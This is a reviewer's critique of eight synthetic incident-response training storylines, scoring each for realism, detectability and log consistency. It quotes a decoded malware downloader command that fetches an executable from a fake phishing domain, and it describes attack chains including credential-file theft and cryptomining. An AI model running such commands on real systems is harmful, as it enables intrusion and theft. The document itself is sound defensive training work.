# Storyline review — Batch 2

Reviewer: senior SOC/DFIR practitioner. Read-only. Each storyline read fully (meta + raw + native).

## Summary table

| id | verdict | recognised | crypto | detect | e2e | logs | one-line reason |
|----|---------|-----------|--------|--------|-----|------|-----------------|
| bec | KEEP | 5 | no | 5 | 4 | 4 | Classic password-spray→BEC; solid evidence; minor ADFS-vs-DC 4625 realism nit |
| ransomware | KEEP (fix) | 5 | no | 5 | 5 | 3 | Textbook LockBit chain; CrowdStrike events render as MDE native |
| oauth | KEEP | 5 | no | 5 | 5 | 4 | Illicit-consent cloud APT, great "reset doesn't revoke token" lesson; minor vendor-label errors |
| cryptomining | REMOVE | 4 | **YES** | 5 | 5 | 4 | Cryptojacking (XMRig/Monero) is the central incident — prohibited |
| dcsync | KEEP (fix) | 5 | no | 5 | 5 | 4 | DCSync→forged-ticket domain dominance; only defect is CrowdStrike→MDE native on NTDS event |
| supply-chain | FIX | 5 | no | 4 | 4 | 3 | Solid vendor-update compromise; AWS region + account-id contradictions break the native pivot |
| mfa-fatigue | FIX | 5 | no | 5 | 5 | 2 | Excellent MFA-fatigue narrative, but every Okta event renders as Microsoft Entra native |
| ntlm-relay | FIX | 5 | no | 4 | 5 | 2 | Great relay fingerprint, but FortiGate renders as Palo Alto and CrowdStrike as MDE; lsass evidence lost in native |

---

## bec — Password Spray → BEC Mailbox Rule

- **Verdict**: KEEP (minor fixes)
- **Recognised incident** 5 — Password spray (T1110.003) → single-factor-then-MFA-approval account takeover (T1078) → BEC inbox hide-rule (T1564.008) + auto-forward (T1114.003) → thread-hijack wire-fraud → MFA fatigue on CFO (T1621). Canonical BEC / M365 ATO pattern.
- **Crypto**: no.
- **Detectable** 5 — First fire realistically: Entra risky sign-in "unfamiliarFeatures / High" (evt_04) and/or 4625 spray burst + 4740 lockouts (evt_01–03); New-InboxRule and Set-Mailbox ForwardingSmtpAddress are high-fidelity UAL detections. All present.
- **End-to-end** 5/4 — Spray IP 158.131.159.30 hits l.harris (evt_01); takeover login from 91.108.56.122 (evt_04); mailbox login→hide-rule→340-item scrape→external forward→wire-fraud email all on 91.108.56.122 (evt_bec_mailbox_access→evt_08); CFO push-bombing from the original spray IP (evt_09) ties the two attacker IPs into one campaign. Pivots by user/IP all connect.
- **Log reliability** 4 — Problems:
  - evt_01_spray: internet IP 158.131.159.30 produces winlog **4625 NTLM LogonType 3 on DC01**, yet the paired firewall log (evt_bec_fw_spray) shows the spray hitting the DMZ **ADFS extranet proxy** (pan.app=ms-adfs). A DC is not internet-facing; AD-FS spray should surface as AD FS / Entra sign-in events, not DC NTLM 4625. Realism nit.
  - evt_04_mfa_accept: raw says `conditional_access_status=notApplied` / `ca_policy_applied=none`, but native `appliedConditionalAccessPolicies[0]` = "Require MFA - All users" result=success — internal contradiction. Also raw browser Chrome 124 vs native Chrome 140.
  - Descriptions are neutral (no "attacker/malicious" leaks). Good.
- **Fixes**: evt_01 → render as Entra/AD FS sign-in failure (or move the 4625 to an internal host), not DC NTLM; evt_04 → make raw CA status match the native (applied/success); align browser version strings.

## ransomware — Ransomware Outbreak (LockBit 3.0)

- **Verdict**: KEEP (fix)
- **Recognised incident** 5 — Phish macro (T1566.001) → encoded PowerShell downloader (T1059.001) → NRD C2 (T1071.001) → fodhelper UAC bypass (T1548.002) → comsvcs LSASS dump (T1003.001) → TGT/PtH for da-backup (T1550.002/T1078) → SMB ADMIN$ (T1021.002) → PsExec SYSTEM (T1569.002) → vssadmin delete (T1490) → wevtutil/1102 (T1070.001) → LockBit encryption (T1486). Textbook big-game ransomware.
- **Crypto**: no — ransom note demands 0.25 BTC (evt_11); per rubric that is a ransom note inside a ransomware story, noted, not flagged.
- **Detectable** 5 — WINWORD→powershell spawn (evt_02), CrowdStrike CredentialDumpingTool (evt_04), vssadmin delete (evt_07), LockBit AV hit (evt_09). Note the server EDR policy is detection-only (evt_rsw_av_miss/evt_09 `not_blocked`) — a realistic reason the encryption completed.
- **End-to-end** 5 — Full host→domain→server chain on WS-FIN-1193 (cmartin) → FS-CORP-01; C2 185.220.101.45 recurs on both hosts (evt_03, evt_rsw_fw_server_c2). Decoded payload: `Invoke-WebRequest -Uri http://nexacorp-updates.net/update.exe`.
- **Log reliability** 3 — Problems:
  - **CrowdStrike→MDE native mismatch (systemic):** evt_02, evt_04, evt_05, evt_07, evt_rsw_av_miss, evt_09, evt_11 all declare vendor "CrowdStrike Falcon" with `crowdstrike.*` raw, but `native.product=mde` and render as Microsoft Defender AdvancedHunting rows (ServiceSource "Microsoft Defender for Endpoint"). A trainee pivoting the native card sees the wrong product, and the CrowdStrike detection narrative (scenario/tactic/technique) is absent from the native evidence.
  - Payload/domain drift: macro downloads `update.exe` from the phishing domain nexacorp-updates.net (evt_02), but C2 beacons to a different domain edge-cdn-updates.xyz (evt_03). Plausible staging, worth a note.
  - evt_02 raw ProcessId 7741 vs native 13888 (and fodhelper 7741 vs 7740) — cosmetic pid drift.
- **Fixes**: re-render evt_02/04/05/07/09/11/av_miss as CrowdStrike native (or change vendor→Microsoft Defender for Endpoint); optionally unify the staged download/C2 domain or add one line explaining the second-stage domain.

## oauth — OAuth App Persistence (Cloud APT)

- **Verdict**: KEEP
- **Recognised incident** 5 — Illicit consent grant / malicious OAuth app persistence (T1528/T1098.001), the APT29-style cloud pattern: spray→MFA→consent-phish→app register→user consent→Graph mail read→SharePoint/OneDrive exfil (T1114.002/T1530).
- **Crypto**: no.
- **Detectable** 5 — "Add application" + "Consent to application" audit with unverified publisher microsoftupdate-secure.xyz (evt_03/04), risky sign-in (evt_02), and SuspiciousOAuthConsent UEBA capstone (evt_10).
- **End-to-end** 5 — Excellent. s.chen sprayed (evt_01) → takeover from 91.108.56.199 → app registered+consented same IP → Graph access shifts to 185.220.101.88 → **helpdesk password reset (evt_06) with `oauth.consent_revoked=false`** → access continues post-reset (evt_07) → SharePoint+OneDrive exfil → app still active (evt_10). Teaches that a password reset does not kill an OAuth grant — high pedagogical value.
- **Log reliability** 4 — Problems:
  - evt_01_spray: vendor "Microsoft Entra ID" but raw carries `authentication.protocol=NTLM` + `logon.type=3` — M365/Entra sign-ins are not NTLM. Wrong appended ECS fields.
  - evt_05/07/08/09 vendor labelled "Microsoft Graph Security API", but these are MailItemsAccessed / FileDownloaded records that come from the **Unified Audit Log** (native.product=m365, which is correct). The Graph Security API is for alerts/incidents, not mail/file access — vendor label is a misnomer.
  - evt_09 description says 89 files / 340 MB bulk, but the single native record is one 3.82 MB file; the aggregate lives only in prose.
  - evt_oauth_baseline: vendor=Okta, raw okta.*, but native.product=entra (same Okta→Entra render issue as mfa-fatigue; here only the baseline event).
- **Fixes**: evt_01 drop NTLM/logon.type (use Entra sign-in failure fields); relabel evt_05/07/08/09 vendor to Microsoft 365 Unified Audit Log; render baseline as Okta native or relabel; optionally add a representative second file record for evt_09.

## cryptomining — Cloud Credential Leak (Cryptomining + Data Breach)

- **Verdict**: REMOVE
- **Recognised incident** 4 — Leaked AWS key → cryptojacking is a real, documented pattern (GuardDuty CryptoCurrency findings, XMRig on GPU instances).
- **Crypto**: **YES — central.** The incident core is cryptomining: RunInstances launches p3.8xlarge GPU fleets whose UserData (base64) installs **XMRig** pointed at `pool.minexmr.com` / `xmr.pool.minergate.com` (evt_cm_04/05); GuardDuty raises `CryptoCurrency:EC2/BitcoinTool.B!DNS` (evt_cm_08); AWS Cost Anomaly flags a $47,320 Monero-mining spend spike (evt_cm_09). Monero/cryptomining is the dominant theme. This violates product-owner requirement #2.
- **Detectable** 5 / **End-to-end** 5 / **Log reliability** 4 — (CloudTrail/GuardDuty field fidelity is actually high; irrelevant given REMOVE.)
- **Fixes**: Remove. If the concept is wanted, a non-crypto rewrite is viable: the same leaked-key→GetCallerIdentity→discovery→CreateUser/AttachUserPolicy→PutBucketPolicy→anonymous S3 exfil (evt_cm_01-03, 06-07, 10-11) is a clean "leaked cloud credential → data breach" story once the two RunInstances/XMRig events, the GuardDuty crypto finding, and the mining-cost event are cut.

## dcsync — DCSync → Golden Ticket (Domain Dominance)

- **Verdict**: KEEP (fix)
- **Recognised incident** 5 — RDP to DC (T1021.001) → Mimikatz (T1003.001) → disable Defender (T1562.001) → DCSync replication of krbtgt (T1003.006) → forged-ticket use (T1558.001/T1550.003) → NTDS.dit via ntdsutil (T1003.003) → shadow DA (T1136.001) → 1102 log clear (T1070.001). Classic domain-dominance.
- **Crypto**: no.
- **Detectable** 5 — Mimikatz AV hit (evt_dc_02), and the gold standard: **4662 with replication GUIDs {1131f6aa}/{1131f6ab} from a user account** (evt_dc_04/05) = DCSync; plus 4769 RC4 on DC02 and the Sentinel "TGS without preceding TGT" hunt noting RC4 was disabled 2024-03-11 (evt_dc_06b) — a genuinely clever golden-ticket tell.
- **End-to-end** 5 — it.admin from 185.220.101.47 (Amsterdam/Tor) RDP→DC01, Mimikatz, disable AV, DCSync domain+krbtgt, forged TGS→DC02 (evt_dc_06/07), ntdsutil snapshot, shadow DA, log clear. Connects cleanly.
- **Log reliability** 4 — Problems:
  - evt_dc_08_ntds: vendor "CrowdStrike Falcon" with rich `crowdstrike.detection.*` raw, but native.product=mde (Defender DeviceFileEvents) — the CrowdStrike→MDE mismatch again; the Falcon detection context is lost in native.
  - Title "Golden Ticket" but data shows forged-ticket **TGS** usage (4769) rather than an explicit TGT forge event — defensible (evt_dc_06b reinforces it) but the label slightly overstates what the logs show.
  - evt_dc_09 merges 4720 + correlated 4728 (Domain Admins) into one record — synthetic but acceptable.
- **Fixes**: render evt_dc_08 as CrowdStrike native (or vendor→MDE); optionally retitle "DCSync → Forged Kerberos Ticket" or add an explicit krbtgt-forge/TGT note.

## supply-chain — Supply Chain Attack (Malicious Vendor Update)

- **Verdict**: FIX
- **Recognised incident** 5 — Trojanised signed vendor update (T1195.002) — SolarWinds/3CX/Codecov family: benign signed download → unsigned child binary from wrong path → NRD C2 → cron persistence → credential-file theft → AWS key abuse → cloud enum/exfil + SSH lateral.
- **Crypto**: no.
- **Detectable** 4 — Ingress is intentionally clean (good fp_explanation). First real fire: evt_sc_03 **unsigned `netpulse-telemetry-svc` from /lib/x86_64-linux-gnu/** (code.signature.trusted=False), C2 beacon to 3-day-old api.telemetry-cdn.net (evt_sc_04), and credential reads of .aws/credentials + jenkins master.key + id_rsa (evt_sc_07).
- **End-to-end** 4 — prod-srv-01 download→install→malicious child→C2→cron→find→cred theft→AWS AssumeRole from Singapore 18.141.220.50→enum→S3 exfil→SSH lateral. The host→cloud pivot rides on AWS account 247316892041 (evt_sc_07 raw ↔ CloudTrail) — but contradictions below weaken it.
- **Log reliability** 3 — Problems:
  - evt_sc_08: raw `awsRegion=eu-west-1` vs native `awsRegion=us-east-1` — region contradiction within one event.
  - evt_sc_10: whole event is account **247316892041** in meta/raw, but the native switches to **677005474693** (recipientAccountId, resources[0].accountId, sessionIssuer.accountId). This breaks the account-id pivot in the native view — the exfil appears to be in a different AWS account than the rest of the story.
  - evt_sc_01: vendor "Squid Proxy" but native.product=zscaler_zia (rendered as a full Zscaler NSS web log). Squid ≠ Zscaler.
  - evt_sc_04: raw `data.srccountry=Israel` vs native `srccountry=Reserved` (native is actually more correct for a 10.x src); raw action=accept vs native action=close. Minor.
- **Fixes**: evt_sc_08 unify region; evt_sc_10 native account ids → 247316892041 (preserve the pivot); evt_sc_01 render as a Squid native/raw log or change vendor→Zscaler; align evt_sc_04 srccountry/action.

## mfa-fatigue — MFA Fatigue → Okta Account Takeover

- **Verdict**: FIX
- **Recognised incident** 5 — MFA fatigue / push bombing → IdP account takeover (T1621/T1078.004), the Scattered-Spider/0ktapus pattern: spray→password success→12 denied pushes→user approves 60th→rogue device enroll→mail access→SharePoint exfil→no-expiry API token→CA-policy tamper→forwarding rule.
- **Crypto**: no.
- **Detectable** 5 — Capstone Sentinel rule MFAFatigue_ExcessivePushWithSuccess (evt mfa_11) with the full count breakdown (47 fails / 12 denied / 60 pushes / 1 approved). push-denied streak then approval is the signature.
- **End-to-end** 5 — All tied to 91.108.4.33 (Moscow) and user j.chen; chain from spray to forwarding rule is coherent and complete.
- **Log reliability** 2 — Major problem:
  - **Every Okta event renders as Microsoft Entra native.** mfa_01/02/03/04/05 declare vendor=Okta with `okta.*` raw and hostname okta-idp.nexacorp.com, but native.product=entra and the record is an Azure AD sign-in/audit row (Microsoft Authenticator, Conditional Access "Require MFA - All users", authenticationProtocol=ropc/oAuth2). The title/raw say Okta ATO; the native card says Entra. A trainee cannot pivot in Okta and the Okta narrative collapses.
  - mfa_05: raw is `okta device.enrollment.create` (DESKTOP-MOSCOW-99, EnrolledDevice), but native re-labels it as Entra "User registered security info / Authenticator App" — the native misrepresents what happened (device enroll vs MFA-method registration).
  - Conceptual muddle: Okta spray + **Entra** CA-policy tamper (mfa_09) treats Okta and Entra as one IdP; plausible only if federated, but unexplained.
  - mfa_06/07/10 (O365 UAL) and mfa_09 (genuine Entra) render correctly.
- **Fixes**: render mfa_01–05 with an Okta native card (okta system-log schema) or, if staying on Entra, change vendor to Microsoft Entra ID and drop okta.* raw; fix mfa_05 native to represent device enrollment; add one line clarifying the Okta↔Entra federation so the CA-policy event is coherent.

## ntlm-relay — NTLM Relay (Internal Credential Hijacking)

- **Verdict**: FIX
- **Recognised incident** 5 — LLMNR/NBNS poisoning + NTLM relay (T1557.001) — Responder/Inveigh + ntlmrelayx: Inveigh on WS-DEV-09 → poisons WS-FIN-03 → victim SMB to attacker → relay to SRV-FILE01 as l.nguyen → PsExec service → SYSTEM → recon → LSASS → SMB lateral spray.
- **Crypto**: no.
- **Detectable** 4 — Inveigh.exe EDR critical (evt ntlm_04); LLMNR unicast answer from a non-authoritative host (ntlm_02); and the relay smoking gun evt ntlm_05: 4624 NTLMv2 where **WorkstationName=WS-FIN-03 but IpAddress=10.0.1.45** (the attacker) — textbook relay fingerprint.
- **End-to-end** 5 — Poisoning→relay→SYSTEM→recon→LSASS→3-way SMB lateral (10.0.2.30/31 + DC01 10.0.0.5). Coherent and complete.
- **Log reliability** 2 — Major problems:
  - **FortiGate renders as Palo Alto.** ntlm_01/02/10/10b/10c declare vendor=FortiGate with `data.*` FortiGate raw, but native.product=paloalto (full PAN-OS TRAFFIC log). Direct vendor/native contradiction — and inconsistent with supply-chain, which renders FortiGate correctly.
  - **CrowdStrike renders as MDE.** ntlm_04/06/08/09 vendor=CrowdStrike Falcon, raw crowdstrike.*, native.product=mde.
  - evt ntlm_09: event_type=process_access with `crowdstrike.GrantedAccess=0x1FFFFF` on lsass (PID 688) — but the native renders **cmd.exe ProcessCreated**, not a ProcessAccessed/lsass-read. The actual credential-access evidence exists only in raw; the native card loses it.
  - evt ntlm_06: event_type=service_install but native ActionType=ProcessCreated (no 7045/service-install semantics).
  - UDP flows carry `session_end_reason=tcp-fin` (PAN artifact on LLMNR UDP) — cosmetic.
- **Fixes**: render firewall events as FortiGate native (fortigate), not paloalto; render EDR events as CrowdStrike native (or vendor→MDE); fix ntlm_09 native to a ProcessAccessed/lsass event preserving GrantedAccess 0x1FFFFF; fix ntlm_06 native to a service-install record.
